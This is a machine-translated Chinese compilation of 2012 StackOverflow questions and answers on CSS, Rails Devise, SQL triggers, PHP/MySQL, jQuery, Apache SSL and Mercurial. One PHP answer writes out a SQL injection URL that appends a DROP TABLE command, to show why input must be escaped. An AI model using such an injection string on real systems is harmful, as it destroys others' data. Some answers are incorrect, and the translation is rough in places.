# StackOverflow 问答 10658000-10658999

# css - 如何覆盖 p:datalist css-class？

> ID：10658002
> 
> 赞同：0
> 
> 时间：2012-05-18T18:36:28.557
> 
> 标签：css, jsf, primefaces, overriding, nested-datalist

我试图在一个 xhtml 文件中覆盖 Primefaces css。是的，它覆盖了它，但是......我有两个嵌套的数据列表（内部和外部），我想在外部有更大的字体，但不是内部的，这就是问题所在，我不知道如何做。即使外层使用 .ui-datalist-itemWithBiggerFont，它仍在使用 li class="ui-datalist-item"。

```
.ui-datalist-item{
    background: none;
    font-family: cursive;
    border: none;
    background-image: none;
}

.ui-datalist-itemWithBiggerFont{
    background: none;
    font-family: cursive;
    border: none;
    background-image: none;
    font-size: larger;  
}

#outer li{
   font-size: larger;    
} 
```

在 xhtml 中：

```
<h:outputStylesheet library="css" name="menu.css"  /> 
            <p:dataList id="outer" value="#{controller.selected.menuMenuId.courseCollection}"  var="course" itemType="course" type="ordered" styleClass=".ui-datalist-itemWithBiggerFont">  
                #{course.heading}, #{course.courseId}

                <p:dataList id="inner" value="#{course.dishCollection}" var="dish" itemType="dish" styleClass=".ui-datalist-item">
                    #{dish.name}
                </p:dataList>    
            </p:dataList> 
```

以及html中的源代码：

```
<div id="outer" class="ui-datalist ui-widget .ui-datalist-itemWithBiggerFont"><div id="j_idt90_content" class="ui-datalist-content ui-widget-content"><ol id="j_idt90_list" class="ui-datalist-data" type="course"><li class="ui-datalist-item">  
                outer, 1

                <div id="outer:0:inner" class="ui-datalist ui-widget .ui-datalist-item"><div id="j_idt90:0:j_idt92_content" class="ui-datalist-content ui-widget-content"><ul id="j_idt90:0:j_idt92_list" class="ui-datalist-data" type="dish"><li class="ui-datalist-item">
                   inner1
                </li><li class="ui-datalist-item">
                    inner2 
```

谢谢！萨米人

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T22:14:31.613

例如，将您想要在新标签中覆盖的内容包装起来`<h:panelGroup>` 并导航到您的 CSS 中的该标签，您还应该使用 firebug 或 google 插件女巫，这肯定会帮助您本地化您需要更改的内容。希望能帮助到你！

# ruby-on-rails - 设计身份验证 - 密码恢复后不确认

> ID：10658004
> 
> 赞同：3
> 
> 时间：2012-05-18T18:36:43.300
> 
> 标签：ruby-on-rails, devise, confirmation, password-recovery

我正在使用带有 Rails 的 Devise 身份验证 gem。

如何显示来自 devise.en.yml 的消息：

```
send_instructions: 'You will receive an email with instructions about how to reset your password in a few minutes' 
```

在发送密码恢复电子邮件后，而不是被重定向到站点的根目录？

**更新：**

我在 devise_controller.rb 中发现了一段有趣的代码：

```
def successfully_sent?(resource)
  notice = if Devise.paranoid
    resource.errors.clear
    :send_paranoid_instructions
  elsif resource.errors.empty?
    :send_instructions
  end

  if notice
    set_flash_message :notice, notice if is_navigational_format?
    true
  end
end 
```

设置断点表明正在调用正确的行，**:send_instructions**分配给**notice**， set_flash_message 被调用，但是我看不到这一切的结果，因为我立即被重定向到根路径。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-18T19:42:00.740

查看设计的 PasswordsController 的源代码：[https ://github.com/plataformatec/devise/blob/master/app/controllers/devise/passwords_controller.rb#L42](https://github.com/plataformatec/devise/blob/master/app/controllers/devise/passwords_controller.rb#L42)

您必须在您的应用程序中创建一个从 Devise::PasswordsController 继承的 PasswordsController，仅实现 after_sending_reset_password_instructions_path_for(resource_name) 方法，并在设置路由时告诉 devise 使用您的控制器

```
class PasswordsController < Devise::PasswordsController
  protected
  def after_sending_reset_password_instructions_path_for(resource_name)
    #return your path
  end
end 
```

在路线中

```
devise_for :users, :controllers => { :passwords => "passwords" } 
```

# sql-server - 子查询返回超过 1 个值。这是不允许的

> ID：10658006
> 
> 赞同：-1
> 
> 时间：2012-05-18T18:36:53.390
> 
> 标签：sql-server, triggers

```
ALTER TRIGGER t1
ON dbo.Customers

FOR INSERT
AS

BEGIN TRANSACTION

/* variables */

DECLARE
    @maxid bigint

SELECT @customerid = id FROM inserted

SET IDENTITY_INSERT dbo.new_table ON

DECLARE
    @maxid bigint

SELECT @maxid = MAX(ID) FROM new_table

INSERT INTO new_table (ID, ParentID, Foo, Bar, Buzz)
    SELECT ID+@maxid, ParentID+@maxid, Foo, Bar, Buzz FROM initial_table

SET IDENTITY_INSERT dbo.new_tableOFF

/* execute */
COMMIT TRANSACTION

GO 
```

失败：

> SQL Server 子查询返回超过 1 个值。当子查询跟随 =、!=、<、<=、>、>= 或子查询用作表达式时，这是不允许的

如何解决？

我想做的是

*   插入`id`和`parentid`，每个增加`@maxid`
*   从`initial_table`
*   进入`new_table`

谢谢

**新表**

```
id (bigint) 
parentid (bigint - linked to id) 
foo | bar | buzz (others are nvarchar, not really important) 
```

**初始表**

```
id (bigint) 
parentid (bigint - linked to id)
foo | bar | buzz (others are nvarchar, not really important) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T18:50:49.160

您正在与我怀疑的一些错误作斗争。

1\. 您正在插入违反 new_table 中唯一约束的值。通过加入要插入的表来避免存在错误。调整连接条件以匹配表的约束：

```
insert into new_table (ID, ParentID, Foo, Bar, Buzz)
    select  ID+@maxid, ParentID+@maxid, Foo, Bar, Buzz 
    from    initial_table i
    left
    join    new_table N on 
            i.ID+@maxid = n.ID or 
            i.ParentID+@maxid = n.ParentId
    where   n.ID is null --make sure its not already there 
```

2\. 在某个地方，子查询返回了您期望的多行。子查询错误可能在插入 dbo.Customer 的代码中（触发 t1），或者可能在 new_table 上定义的触发器中。我在发布的代码中看不到任何会引发子查询异常的内容。

将触发器（又名地雷）插入到定义了触发器的表中是一种痛苦的方法。如果可能，请尝试将其中的一些逻辑从触发器中重构为您可以在逻辑上遵循的代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T19:55:09.573

首先，您必须假设插入或删除的记录不止一条。您不应该将插入或删除表中的值设置为 SQL 服务器触发器中的标量变量。如果插入包含多个记录并且迟早会出现问题，则会导致问题。

接下来，您永远不应该考虑在触发器中设置身份插入。你在想什么？如果您有一个身份字段，请使用它，然后不要尝试手动创建一个值。

接下来，子查询问题显然与另一个触发器相关联，您还假设一次只处理一条记录。我怀疑您需要检查数据库中的每个触发器并解决这个基本问题。

现在，当您运行这部分代码时：

```
INSERT INTO new_table (ID, ParentID, Foo, Bar, Buzz) 
SELECT ID+@maxid, ParentID+@maxid, Foo, Bar, Buzz FROM initial_table 
```

您正在尝试在表中插入所有记录，而不仅仅是插入的记录。因此，由于您在另一个表上的触发器编写不正确，因此您遇到了一个错误，该错误实际上隐藏了当您尝试将 2000 条具有相同 PK 的记录插入新表时会遇到的错误，或者如果您没有PK，每次插入一条记录时，它都会很乐意将它们全部插入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:52:00.460

您有一个包含以下语句的触发器：

```
SELECT @customerid = id FROM inserted 
```

该`inserted`表包含插入（或为`UPDATE`触发器更新）的每一行的一行。执行的语句插入了多行，触发了触发器，并且您的假设被暴露了。

重新编码触发器以操作行集，而不是单行。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-05-18T18:51:08.457

在任何类型的选择中使用子查询时，请尝试调整您的查询，以便子查询仅返回 1 个值而不是多个值。

如果需要多个，则以表成为主查询的一部分的方式重组查询。

我给出了 SQL 的例子： Select col1, (select col2 from table2 where table2.col3=table1.col4) from table1; 如果 col2 返回多行，则查询失败，然后将其重写为：

选择 col1, col2 from table1,table2 where table2.col3=table1.col4;

我希望你明白这一点。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2012-05-18T18:45:50.660

你不应该选择它，你应该设置它。

```
SET @maxid = MAX(ID) FROM another_table 
```

# c# - 用于推荐具有相似品味的项目的数据库/软件模式？

> ID：10658007
> 
> 赞同：0
> 
> 时间：2012-05-18T18:36:59.287
> 
> 标签：c#, sql-server, asp.net-mvc-3, recommendation-engine

我想在我的网站上建立一个推荐系统，这样人们就可以“喜欢”某些东西，然后显示其他人也喜欢的其他东西。如果您愿意，可以使用“推荐”系统。

例子：

*   亚马逊 - 也显示其他人喜欢的商品。
*   Newegg - 显示其他人一起购买的物品。
*   9gag - 显示其他人喜欢的图片。

我是这种软件设计的新手，根本不知道从哪里开始。会喜欢一些建议和阅读材料，甚至更好的是已经由更聪明的人设计的模式。

我的项目将是“喜欢”或“中立”（用户没有做任何事情）。该项目没有经过微调的评级系统，我认为这将简化所需的算法。

我的平台是 C#，以 ASP.Net MVC3 和 MSSQL 2008 作为后端；如果这与讨论有关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:52:26.947

构建基于推荐的算法通常不遵循一组特定的设计模式......它们因应用程序的领域而异......

如果您不了解这类算法的概念/机制，这些算法是基于集体智能、机器学习、众包等概念构建的......

[编程集体智能](https://rads.stackoverflow.com/amzn/click/com/0596529325)是迄今为止你能得到的最好的读物……这本书应该给你一个很好的视角来了解如何为你的需求构建一个算法。但不幸的是，这本书使用 python ......作为代码示例......但这些概念仍然非常有用......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:50:50.367

您可能想阅读描述此问题空间的书籍，例如[智能网络算法](https://rads.stackoverflow.com/amzn/click/com/1933988665)或较早的[编程集体智能](http://shop.oreilly.com/product/9780596529321.do)。

# php - mysql 插入命令出错

> ID：10658014
> 
> 赞同：3
> 
> 时间：2012-05-18T18:37:25.517
> 
> 标签：php, mysql, database, insert

所以，我正在创建一个密码更改表

当一些 1 更改通过时，我在 PassChange 表中插入他的用户名、newpass 和确认代码，（所以我之后给他发送一封确认电子邮件）这个想法很简单，这是我使用的代码

```
 $insertResult=mysql_query("INSERT INTO TempChangePass (UserName, NewPass, ConfirmationCode) VALUES ('$UserName', '$newPass', '$code')") or die (mysql_error()); 
```

虽然我收到此错误：您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 'username''、'4da59df8d4007807e7230e0881fbf774'、'16585482')' 附近使用正确的语法

注意：表中的所有列格式都设置为 varchar。

mysql数据库连接正常，表名正确。

这个问题快把我逼疯了，我就是不知道问题出在哪里，如果有人能帮助我，将非常感激:)

并提前感谢。

编辑：我实际上已经解决了，仅针对通过搜索解决方案访问此帖子的人，如果您的 sql 命令遇到类似问题，请尝试回显它，并查看字符串是如何移动到数据库的 :-)，祝大家编码愉快。

对不起，如果我浪费了你的任何时间 :) 我对 php 和 mysql 很陌生 :D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:40:08.977

删除变量周围的单引号。PHP 将它们解释为字符串。

```
 $insertResult=mysql_query("INSERT INTO TempChangePass (UserName, NewPass, ConfirmationCode) VALUES ('" . $UserName. "', '" . $newPass. "', '" . $code . "')") or die (mysql_error()); 
```

此外，您可能想要执行以下操作：

```
$sql = "INSERT INTO TempChangePass (UserName, NewPass, ConfirmationCode) VALUES ('" . $UserName. "', '" . $newPass. "', '" . $code . "')";

echo $sql; 
```

接受那个回声，然后尝试手动运行它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T18:40:09.047

看起来您的实际用户名中有单引号 - 您实际上是在传递`'username'`而不是`username`. 尝试删除这些，看看它是否会在那之后工作。

处理此问题（并防止 SQL 注入）的推荐方法是使用[准备好的语句](http://php.net/manual/en/pdo.prepared-statements.php)，但是如果您真的想要，您可以使用`mysql_real_escape_string($UserName)`( [reference](http://us2.php.net/manual/en/function.mysql-real-escape-string.php) )内联执行此操作

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T18:40:47.253

看起来像 sql inyection。我很确定你的 $username 是 $username = "username'"。看单引号。所以查询变成了：

$insertResult=mysql_query("INSERT INTO TempChangePass (UserName, NewPass, ConfirmationCode) VALUES ('username* *''* *, '4da59df8d4007807e7230e0881fbf774', '16585482')") 或死 (mysql_error());

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T18:44:31.893

您是否尝试过一列一栏的查询？

我的意思是 ：

```
INSERT INTO TempChangePass (UserName) values ( '$UserName' ); 
```

然后加起来？

主要是在我遇到错误时为我工作；）

只是一个想法。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-18T18:51:49.677

在进行查询之前尝试使用清理脚本。

采用

```
mysql_real_escape_string() 
```

**编辑**

您现在应该使用该`MySQLi`版本

```
mysqli_real_escape_string() 
```

或 OOP 方法

```
mysqli::real_escape_string() 
```

[为什么使用 MySQLi 而不是 MySQL？](https://stackoverflow.com/a/8891552/1393400)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-18T18:56:03.147

试试这个：

```
$insertResult=mysql_query("INSERT INTO TempChangePass(UserName, NewPass, ConfirmationCode) VALUES('$UserName', '$newPass', '$code')") or die (mysql_error()); 
```

您的 SQL 中有一些额外的空格。

# javascript - 将变量从悬停传递到悬停

> ID：10658015
> 
> 赞同：3
> 
> 时间：2012-05-18T18:37:31.123
> 
> 标签：javascript, jquery, variables, hover

## [http://jsfiddle.net/MwQbE/](http://jsfiddle.net/MwQbE/)

我有下面的 jQuery，但我无法将变量传递给第二个函数

```
$("img").hover(function(){
    var $image = $(this);
    var $imageNowWidth = $image.width();
},function() {
    // get variable value for $image and $imageNowWidth   
});​ 
```

在 jsFiddle 上测试时它不起作用，我该怎么做才能将变量传递给第二个函数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T18:38:32.487

只需在外部定义这两个变量`.hover`，然后您就可以在 mouseleave 函数中使用它们。见下文，

```
var $image, $imageNowWidth;
$("img").hover(function(){ //mouseenter
   $image = $(this);
   $imageNowWidth = $image.width();
},function() {            //mouseleave
    //$image and $imageNowWidth is accessible HERE
});​ 
```

只是想澄清一下，这`this`将在`mouseleave`函数内部可用，以便您可以在内部执行相同或更多操作`mouseenter`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T18:50:56.140

定义`getter`and `setter`for `image`and`imageNoWidth`如下，

```
var getImage, getImageNoWidth;
$("img").hover(function(){
   $image = $(this);
   $imageNowWidth = $image.width();
    getImage = function(){
        return $image;
    };
    getImageNoWidth = function(){
        return $imageNowWidth;
    };
},function() {
    // get variable value for $image (getImage()) and $imageNowWidth (getImageNoWidth())
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T18:38:46.283

在外部声明变量，以便在两个函数中都可以访问它。

```
var image;
var imageNowWidth;
$("img").hover(function(){
    image = $(this);
    imageNowWidth = $image.width();
},function() {
    // get variable value for $image and $imageNowWidth   
});​ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T18:41:46.107

使用 jquery 'data' 方法将变量直接存储在 jquery 对象上：

```
$("img").hover(function(){
    var $image = $(this);
    $image.data('imageNowWidth',$image.width());
},function() {
    var previousImageWidth = $(this).data('imageNowWidth');
    // do whatever you want to do with the width       
});​ 
```

# apache - Apache 错误：_default_ virtualhost 在端口 443 上重叠

> ID：10658017
> 
> 赞同：63
> 
> 时间：2012-05-18T18:37:35.263
> 
> 标签：apache, virtualhost

尝试启动 Apache 时出现此错误。

> _default_ virtualhost 在端口 443 上重叠

我正在尝试设置 SSL。几乎每个在线解决方案都说添加：

```
NameVirtualHost *:443 
```

到 conf 文件，但 Apache 仍然无法启动，只是说

> 动作启动失败。apache日志可能有更多信息

Apache 日志中的信息为零。

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2012-07-23T15:06:28.753

要解决 Debian/Ubuntu 系统上的问题，请`/etc/apache2/ports.conf`通过添加来修改设置文件`NameVirtualHost *:443`。我`ports.conf`目前如下：

```
# /etc/apache/ports.conf
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default
# This is also true if you have upgraded from before 2.2.9-3 (i.e. from
# Debian etch). See /usr/share/doc/apache2.2-common/NEWS.Debian.gz and
# README.Debian.gz

NameVirtualHost *:80
Listen 80

<IfModule mod_ssl.c>
    # If you add NameVirtualHost *:443 here, you will also have to change
    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
    # to <VirtualHost *:443>
    # Server Name Indication for SSL named virtual hosts is currently not
    # supported by MSIE on Windows XP.

    NameVirtualHost *:443

    Listen 443
</IfModule>

<IfModule mod_gnutls.c>
    NameVirtualHost *:443
    Listen 443
</IfModule> 
```

此外，确保未启用**“站点可用/默认 SSL”**`a2dissite default-ssl` ，键入以禁用该站点。当您使用它时`a2dissite`，自行键入以获取列表，并查看您是否启用了任何其他可能映射到端口 443 的站点设置。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2013-04-18T23:42:15.677

在 CentOS 中安装 vanilla Apache2 时，当您安装 mod_ssl 时，它会自动在以下位置添加一个配置文件：

```
{apache_dir}/conf.d/ssl.conf 
```

此配置文件包含端口 443 的默认虚拟主机定义，名为*default* :443。如果您也有自己的 443 虚拟主机定义（即在 httpd.conf 中），那么您将遇到冲突。由于首先包含 conf.d 文件，因此它们会胜过您的文件。

要解决冲突，您可以从中删除虚拟主机定义`conf.d/ssl.conf`或将其更新为您自己的设置。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-05-18T20:26:27.763

添加是不太可能`NameVirtualHost *:443`是正确的解决方案，因为在少数情况下可以通过 SSL 支持基于名称的虚拟主机。阅读[this](http://en.gentoo-wiki.com/wiki/Apache2/SSL_and_Name_Based_Virtual_Hosts)和[this](http://www.geekwisdom.com/dyn/node/215)了解一些细节（那里可能有更好的文档；这些只是我发现的详细讨论该问题的文档）。

如果你正在运行一个相对库存的 Apache 配置，你可能在某个地方有这个：

```
<VirtualHost _default_:443> 
```

您最好的选择是：

*   将您的附加 SSL 配置放入此现有`VirtualHost`容器中，或
*   注释掉整个`VirtualHost`块并创建一个新块。不要忘记包括所有相关的 SSL 选项。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-10-22T22:28:50.433

我遇到了这个问题，因为我有多个相同端口的通配符条目。您可以通过执行以下命令轻松检查`apache2ctl -S`：

```
# apache2ctl -S
[Wed Oct 22 18:02:18 2014] [warn] _default_ VirtualHost overlap on port 30000, the first has precedence
[Wed Oct 22 18:02:18 2014] [warn] _default_ VirtualHost overlap on port 20001, the first has precedence
VirtualHost configuration:
11.22.33.44:80       is a NameVirtualHost
         default server xxx.com (/etc/apache2/sites-enabled/xxx.com.conf:1)
         port 80 namevhost xxx.com (/etc/apache2/sites-enabled/xxx.com.conf:1)
         [...]
11.22.33.44:443      is a NameVirtualHost
         default server yyy.com (/etc/apache2/sites-enabled/yyy.com.conf:37)
         port 443 namevhost yyy.com (/etc/apache2/sites-enabled/yyy.com.conf:37)
wildcard NameVirtualHosts and _default_ servers:
*:80                   hostname.com (/etc/apache2/sites-enabled/000-default:1)
*:20001                hostname.com (/etc/apache2/sites-enabled/000-default:33)
*:30000                hostname.com (/etc/apache2/sites-enabled/000-default:57)
_default_:443          hostname.com (/etc/apache2/sites-enabled/default-ssl:2)
*:20001                hostname.com (/etc/apache2/sites-enabled/default-ssl:163)
*:30000                hostname.com (/etc/apache2/sites-enabled/default-ssl:178)
Syntax OK 
```

请注意输出的开头是几条警告行。这些将指示哪些端口正在造成问题（但您可能已经知道）。

接下来，查看输出的末尾，您可以准确地看到虚拟主机定义的哪些文件和行导致了问题。在上面的例子中，端口 20001 被分配在`/etc/apache2/sites-enabled/000-default`第 33 行和`/etc/apache2/sites-enabled/default-ssl`第 163 行。同样`*:30000`在 2 个地方列出。解决方案（在我的情况下）只是删除其中一个条目。

# mysql - 将信息数组插入 MySQL 数据库时遇到问题

> ID：10658018
> 
> 赞同：0
> 
> 时间：2012-05-18T18:37:43.047
> 
> 标签：mysql, database, arrays, insert

我在将一组信息插入 mysql 数据库时遇到问题。基本上，我构建了一个类似于 Facebook 相册的可排序图库，可以通过将 div 移动到具有 jquery 可排序功能的新位置来进行排列。

我正在使用 Ajax 调用一个 php 文件，该文件会将 div 的新顺序插入到数据库中。信息被正确传递，只是没有被正确插入。

**我收到的错误是：**
您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在第 1 行的“Array”附近使用的正确语法

**php代码是：**

```
foreach ($_GET['listItem'] as $position => $item) {
    if ($item >= 1) {
        $sql[] = "UPDATE table SET order = '{$position}' WHERE id = '{$item}'";
        mysql_query($sql) or die(mysql_error());
    }
} 
```

**如果我删除 mysql_query 函数并只执行 print_r，我会得到：**

```
Array
(
    [0] => UPDATE table SET order = '0' WHERE id = '2'
    [1] => UPDATE table SET order = '1' WHERE id = '4'
    [2] => UPDATE table SET order = '2' WHERE id = '3'
    [3] => UPDATE table SET order = '3' WHERE id = '1'
    [4] => UPDATE table SET order = '4' WHERE id = '5'
    [5] => UPDATE table SET order = '5' WHERE id = '6'
) 
```

这是我第一次尝试做这样的事情。任何帮助都会很棒。

预先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:41:01.450

In`mysql_query($sql)` `$sql`是一个数组，因此它的值很简单`Array`。当您分配时，`$sql[] = "UPDATE table SET order = '{$position}' WHERE id = '{$item}'";`只需制作此行`$sql = "UPDATE table SET order = '{$position}' WHERE id = '{$item}'";`。那应该可以解决您的问题。

编辑：

您可以离开`[]`并简单地`mysql_query`从它所在的位置删除。在您的 foreach 列表项之后，添加以下内容：

```
foreach($sql as $query) {
    mysql_query($query);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:51:21.440

听起来对 [] 运算符的作用有些混淆。当您想将一个元素附加到现有数组的末尾时，您可以使用 []。

例如：

```
 $sql = array();
 $sql[] = 'UPDATE table SET order = "0" WHERE id = "2"';
 mysql_query($sql); // this will produce the error you are seeing 
```

相对：

```
 $sql = 'UPDATE table SET order = "0" WHERE id = "2"';
 mysql_query($sql); // this will work 
```

你应该这样重写你的代码：

```
foreach ($_GET['listItem'] as $position => $item) {
  if ($item >= 1) {
    $sql = "UPDATE table SET order = '{$position}' WHERE id = '{$item}'";
    mysql_query($sql) or die(mysql_error());
  }
} 
```

这将做你想要的。但是，这仍然不是一个好主意，因为您将不受信任的 $_GET 数据直接传递到数据库。例如，我可以使用如下字符串调用您的脚本：

```
http://yoursite.com/yourscript.php?listItem=1'%3B%20DROP%20TABLE%20yourtable%3B 
```

由于 的值`listItem`直接进入数据库——并且`$item >= 1`检查是不够的，因为如果字符串以数字数据开头，PHP 会将字符串评估为整数——我所要做的就是添加一个单引号来终止前一个查询，然后我可以自由地注入我想要的任何 SQL 命令；这是一个基本的 SQL 注入攻击。每当您编写涉及数据库的代码时，您都应该清理任何可能进入数据库的输入。您的代码的最终版本可能如下所示：

```
foreach ($_GET['listItem'] as $position => $item) {

  if ($item >= 1) { // this check may or may not be needed depending on its purpose

    $sql = 'UPDATE table SET order = "' . mysql_real_escape_string($position) . '" WHERE id = "' . mysql_real_escape_string($item) . '"';
    mysql_query($sql) or die(mysql_error());

  }

} 
```

还有其他方法可以清理输入数据，这只是其中之一。希望有帮助。

# javascript - 有关 Javascript 安全性的文章

> ID：10658019
> 
> 赞同：-1
> 
> 时间：2012-05-18T18:37:52.347
> 
> 标签：javascript, article, javascript-security

我正在搜索 Javascript 安全性的基础知识及其弱点。我已经在阅读 Javascript: The Complete Rereference 2nd Edition。我正在寻找好文章。请问有什么建议吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T18:40:31.113

阅读《Head First Javascript》这本书……它比完整的参考书更好，而且会给你你想要的……

# java - 如何将特定的班级成员保留在proguard中？错误期望在 arg 之前分隔 ',' 或关闭 ')'

> ID：10658025
> 
> 赞同：1
> 
> 时间：2012-05-18T18:38:34.843
> 
> 标签：java, proguard

下面的语法有问题：

```
 -keepclassmembers class * {
 public void changeView(android.view.View v); 
```

}

错误：期望在 'v' 之前分隔 ',' 或关闭 ')'

没有看到它真的需要一个，或），但这就是我得到的错误。

看到完全相同的错误：

```
-keep class com.test.activities.MyActivityActivity {
public void changeView(android.view.View v); 
```

}

有人愿意分享这有什么问题吗？

它在处理回调方法下的手册中说：

```
 -keep class mypackage.MyCallbackClass {
void myCallbackMethod(java.lang.String);
} 
```

这不正是我正在做的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T18:57:17.313

在您的签名中给出变量名称 ( ) 是没有意义的`v`，因为它们无论如何都不存在于字节码中（除了在被 Proguard 忽略/剥离的调试信息中）。

错误是正确的，因为没有变量名，在`)`/`,`而不是`v`.

# ruby-on-rails-3 - Gem::LoadError: 在 [] 中找不到 ruby gems-bundler (>= 0)

> ID：10658028
> 
> 赞同：1
> 
> 时间：2012-05-18T18:38:45.490
> 
> 标签：ruby-on-rails-3, rvm, bundler

我正在使用 ruby​​ 1.9.3 运行 rvm。我跑了`bundle install`，效果很好。但是当我跑步时，`bundle install --deployment`我得到了这个：

```
volunteer-app ➜ bundle install --deployment
Fetching gem metadata from http://rubygems.org/.......
Installing rake (0.9.2.2) 
Gem::LoadError: Could not find rubygems-bundler (>= 0) amongst []
An error occured while installing rake (0.9.2.2), and Bundler cannot continue.
Make sure that `gem install rake -v '0.9.2.2'` succeeds before bundling. 
```

运行后，我查看`vendor/bundle/ruby`目录并显示`1.9.1`. 所以看起来好像`bundle install --deployment`没有从 rvm 的默认 ruby​​ 版本中识别出我的宝石`1.9.3`。

关于我可能会错过的任何想法。

**编辑** 这是我的`gem env`：

```
RubyGems Environment:
  - RUBYGEMS VERSION: 1.8.24
  - RUBY VERSION: 1.9.3 (2012-04-20 patchlevel 194) [x86_64-linux]
  - INSTALLATION DIRECTORY: /home/sosl/.rvm/gems/ruby-1.9.3-p194@teer
  - RUBY EXECUTABLE: /home/sosl/.rvm/rubies/ruby-1.9.3-p194/bin/ruby
  - EXECUTABLE DIRECTORY: /home/sosl/.rvm/gems/ruby-1.9.3-p194@teer/bin
  - RUBYGEMS PLATFORMS:
    - ruby
    - x86_64-linux
  - GEM PATHS:
     - /home/sosl/.rvm/gems/ruby-1.9.3-p194@teer
     - /home/sosl/.rvm/gems/ruby-1.9.3-p194@global
  - GEM CONFIGURATION:
     - :update_sources => true
     - :verbose => true
     - :benchmark => false
     - :backtrace => false
     - :bulk_threshold => 1000
  - REMOTE SOURCES:
     - http://rubygems.org/ 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T04:05:25.517

这是 ruby​​gems-bundler 和 bundler 中的一个错误，我已经为 ruby​​gems-bundler 修复了它，并且 bundler 的修复正在等待合并。

最快的修复方法是更新 ruby​​gems-bundler：

```
gem update rubygems-bundler 
```

供参考的是捆绑器的拉取请求：

*   [https://github.com/carlhuda/bundler/pull/1925](https://github.com/carlhuda/bundler/pull/1925)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T21:41:35.970

当我昨晚刚刚经历了一些类似的事情时，我真的很同情你。虽然我当然不是专家（我和你一样只是 RoR 的学生），但我可以提出一些建议吗？

1.  使用 RVM 更改为您的 RUBY 版本后，运行“本地”gem 列表以查看本地安装了哪些 gem。您是否在本地 gem 中安装了 gem？
2.  有时 gem 文件会“混乱”并完全停止工作。您是否尝试过卸载然后重新安装 gems？命令很简单。在您的控制台中键入“gem uninstall（您要卸载的 gem 的名称和版本号）。它可能会回复您要卸载的 gem 依赖于您已安装的其他 gem。一旦重新安装这些 gem，请不要担心将满足依赖关系。
3.  我不知道 Bundler 是否自动安装。它是否列在您的“本地”gem 或 gemfile.lock 中？

祝你好运纠正这一点。

# version-control - 如何使用两个主要的并行分支重构 mercurial 存储库

> ID：10658032
> 
> 赞同：2
> 
> 时间：2012-05-18T18:39:08.610
> 
> 标签：version-control, mercurial, branch

我的存储库的历史如下所示：

```
A -- B -- C (branch "foo")
      \
       -- D (branch "bar") 
```

这两个分支都是“运输”分支，本质上是不同的前端到一个共同的后端。

所有代码过去都在一个分支中，通过编译器开关打开或关闭`foo`或功能，但我进行了分支以便更容易单独处理每个代码。`bar`

问题是，常见的“后端”文件本身可能应该是一个单独的分支——我经常只想*处理*那些常见的文件。由于我创建这些分支的方式，历史有点搞砸了：在 branch`bar`的过去，它曾经具有来自`foo`.

目前，我只是在一个分支上进行更改，然后使用`hg transplant`将相同的更改复制到另一个分支。

相反，我希望能够以这种方式进行更改：

```
 __ C __ D'   (branch "foo")
      /      /
A -- B -- D         (branch "backend")
      \      \
       -- E -- D''  (branch "bar") 
```

也就是说，在分支上工作`backend`，然后在每个运输分支（`foo`和`bar`）中，我使用`hg merge backend`.

从我目前的情况到我所描述的情况的最佳方式是什么？我能想到的唯一方法是：

1.  删除所有`foo`和`bar`功能，并命名该分支`backend`。

2.  删除旧的`foo`和`bar`分支。

3.  手动添加`foo`功能`backend`并命名该分支`foo`，同样为`bar`.

有没有更好的办法？

另外，这是正确的做法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:03:29.097

`foo`分支上有多少变更集`bar`？后端（移植的）变更集是否与前端变更集分开？

如果变更集不多，而且很干净，那么您可能需要这样做：

```
 C -- 1 -- 2 -- D -- 3   (branch "foo")
      /      
A -- B ----------- C" -- D"   (branch "backend")
      \      
       C' -- 4 ------ D' --- 5   (branch "bar") 
```

（这里 A、B、C、D 与后端相关；1、2、3 与 foo 相关；4、5 与 bar 相关。）

— 即，基于 and 的最新共同祖先创建您的分支，`backend`然后将所有与后端相关的变更集移植到那里。从此时起，您将能够合并到任一分支。`foo``bar``backend`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T23:43:04.677

我选择将其拆分为多个存储库，而不是一个存储库中的多个分支，如下所示：

1.  我关闭了`bar`分支。

2.  我将原始存储库克隆到一个新存储库`backend`中。

3.  我删除了所有与 -`foo`相关的代码。

4.  我将这些更改提取到主存储库中，然后立即撤消它们（因此`foo`代码仍然存在）。这成了我的`foo`存储库。

